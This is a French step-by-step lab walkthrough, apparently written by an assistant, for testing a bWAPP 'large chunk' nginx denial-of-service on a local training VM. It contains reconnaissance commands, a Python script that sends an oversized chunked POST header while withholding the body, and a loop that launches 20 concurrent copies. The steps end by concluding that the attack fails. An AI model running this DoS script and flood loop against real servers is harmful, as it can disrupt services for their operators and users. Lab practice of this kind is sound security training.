# Etape 1 : Vérifier que la cible HTTP est joignable et quel serveur répond. On ne lance pas d’attaque sans confirmer la cible.

## Sous-étapes :
1. Test HTTP rapide : curl -I http://127.0.0.1:8081/
2. Test port bas-niveau (optionnel) : nc -vz 127.0.0.1 8081

## Conclusion en théorie (attendu)
curl -I renvoie un en-tête HTTP (ex. HTTP/1.1 200 OK ou 302, 404). Cela confirme serveur HTTP accessible.
nc affiche succeeded si le port est ouvert.
Si aucune réponse ou connexion refusée, la cible n’est pas joignable et il faut corriger l’accès avant de continuer.

# Étape 2 : Vérifier si le service vulnérable (Nginx) écoute sur les ports indiqués (8080 / 8443) et localiser le script nginx_dos.py mentionné par bWAPP.

## Sous-étapes :
1. voir quels services écoutent sur 8080 / 8443 / 8081 (affiche port + PID/programme)
sudo ss -tlnp | grep -E '8080|8443|8081' || true

2. chercher le script nginx_dos.py dans les racines web communes
sudo find /var/www /var/www/html /usr/share -type f -iname 'nginx_dos.py' 2>/dev/null || true

## Conclusion en théorie (attendu)
ss montrera si un processus nginx (ou autre) écoute sur 8080/8443. Si oui on a la cible DoS.
find renverra le chemin vers nginx_dos.py s’il est présent sur la VM (ex. /var/www/html/evil/nginx_dos.py).
Si rien n’apparaît, alors soit la VM fournie n’est pas la version «bee-box» attendue, soit le script n’est pas installé. Dans ce cas on décidera de copier/installer le script localement ou d’adapter l’attaque.

# Étape 3 : Confirmer l'URL publique du service vulnérable et vérifier si /evil/nginx_dos.py est servi. Rechercher les dossiers evil ou scripts similaires sur la machine.
Conclusion rapide :
nginx (ou un service Docker exposé) écoute sur 0.0.0.0:8080.
Apache répond sur 8081.
Le script nginx_dos.py n'existe pas dans les racines web testées.

## Sous-étapes :
1. Vérifier réponse HTTP sur 8080 et 8443
curl -I http://127.0.0.1:8080/
curl -Ik https://127.0.0.1:8443/

2. Tenter de télécharger le script annoncé
curl -sS -D - http://127.0.0.1:8080/evil/nginx_dos.py -o /tmp/nginx_dos.py || true

3. Chercher dossiers 'evil' et fichiers contenant 'nginx' et 'dos' dans /var/www, /opt, /srv, /home
sudo find /var/www /var/www/html /usr/share /opt /srv /home -type d -iname 'evil' 2>/dev/null || true
sudo find /var/www /var/www/html /usr/share /opt /srv /home -type f -iname '*nginx*dos*.py' 2>/dev/null || true

## Conclusion en théorie (attendu)
curl -I http://127.0.0.1:8080/ doit renvoyer un en-tête (200/302/404).
curl -Ik https://127.0.0.1:8443/ indique si HTTPS écoute (certificat possible, -k ignore validation).
Si curl télécharge /evil/nginx_dos.py il sera sauvegardé dans /tmp/nginx_dos.py et on l'examinera ensuite.
Si find retourne des dossiers ou fichiers, tu auras le chemin exact pour exécuter ou lire le script.
Si rien n'apparaît on créera localement un petit script d'attaque contrôlée pour tester le comportement chunked (Low).

# Étape 4 : Tester localement si le serveur accepte une requête Transfer-Encoding: chunked avec une taille de chunk déclarée très grande mais sans envoyer les données. Si le serveur bloque en attente des données il est vulnérable au DoS large-chunk.

## Sous-étapes :
1. 
nano /tmp/test_chunk.py
2. 
#!/usr/bin/env python3
import socket, time

HOST = "127.0.0.1"
PORT = 8081  # adapte ici si besoin

print(f"Connexion à {HOST}:{PORT} ...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((HOST, PORT))

req = (
    "POST / HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "User-Agent: test-chunk\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: close\r\n"
    "\r\n"
)
s.sendall(req.encode())

# Déclare un chunk très grand (0x10000000 = 268435456) mais envoie très peu de données
s.sendall(b"10000000\r\n")  # taille du chunk (hex)
s.sendall(b"X\r\n")         # données insuffisantes

try:
    data = s.recv(4096)
    if data:
        print("Réponse reçue :")
        print(data.decode(errors='ignore'))
    else:
        print("Aucune donnée reçue (connexion fermée).")
except socket.timeout:
    print("Timeout : pas de réponse dans le délai imparti.")
finally:
    s.close()
    print("Connexion fermée.")

3. 
chmod +x /tmp/test_chunk.py
python3 /tmp/test_chunk.py

## Conclusion en théorie (attendu)
Si le serveur renvoie immédiatement une erreur HTTP (400/411/413) ou ferme la connexion, il gère correctement la validation et n’est pas vulnérable au vecteur simple.
Si la connexion reste ouverte sans réponse et le serveur consomme CPU/mémoire ou d’autres connexions deviennent lentes, cela indique une vulnérabilité DoS liée au chunked large.
Si tu obtiens une réponse courte (ex. page d’erreur) note-la.
Colle la sortie du script et l’état du serveur (commande top ou ps aux --sort=-%mem | head) si tu observes un comportement anormal. Je te donnerai alors la conclusion et l’étape suivante.

# Étape 5 : Confirmer le blocage en ouvrant plusieurs connexions simultanées et observer la saturation du service.

## Sous-étapes :
1. 
# Lancer 20 requêtes concurrentes vers le serveur
for i in $(seq 1 20); do
  python3 /tmp/test_chunk.py &
done

# Observer la charge
top -b -n1 | head -20
sudo ss -tanp | grep 8081 | wc -l

## Conclusion en théorie (attendu)
Si le nombre de connexions actives augmente et le serveur commence à ralentir ou refuser de nouvelles connexions → vulnérabilité confirmée (DoS large chunk).
Si tout reste stable et les connexions se ferment rapidement → le serveur gère les timeouts correctement et n’est pas vulnérable en pratique.

## Conclusion rapide
Le test montre timeouts répétés et le nombre de connexions sur 8081 reste à 6. Le serveur accepte des connexions mais n’ouvre pas de réponses immédiates. Comportement cohérent avec un service qui met en attente les requêtes chunked et limite le nombre de connexions concurrentes plutôt que de tomber immédiatement en crash.

# Étape 6 : Observer l’état précis des connexions et identifier le processus qui tient les sockets pour confirmer si les connexions sont ESTABLISHED et bloquent des threads ou si elles sont dans un autre état (SYN_RECV, CLOSE_WAIT). Identifier le PID et vérifier sa charge / threads.

## Sous-étapes :
1. lister toutes les connexions vers 8081 avec état et PID
sudo ss -tanp | grep ':8081'

2. lister sockets et PID/commandes détaillés
sudo lsof -nP -iTCP:8081

3. pour chaque PID trouvé (ex: 1773), afficher info process + threads
3. remplace <PID> par le PID retourné (ex: 1773)
ps -p <PID> -o pid,ppid,user,pcpu,pmem,cmd
sudo ls -l /proc/<PID>/fd | wc -l
sudo ps -L -p <PID> --no-headers | wc -l

4. si docker est présent, lister containers et mapping de ports
sudo docker ps -a --format 'table {{.ID}}\t{{.Names}}\t{{.Ports}}'

## Conclusion en théorie (attendu)
Si ss/lsof montre beaucoup d’entrées ESTABLISHED liées au même PID, alors le serveur garde des connexions ouvertes et les threads/processus sont bloqués.
Si ls /proc/<PID>/fd et ps -L montrent un grand nombre de descripteurs/threads, le service est stressé par les connexions.
Si les connexions sont majoritairement dans d’autres états (SYN_RECV, CLOSE_WAIT) l’origine est différente (network/TCP stack).
Si docker indique un container mappant 8081, on regardera logs du container ensuite.

## Conclusion
Les états FIN-WAIT-2 côté serveur et CLOSE-WAIT côté client montrent que le serveur ferme activement les connexions. Pas de blocage. Le vecteur “chunk géant + données insuffisantes” échoue ici.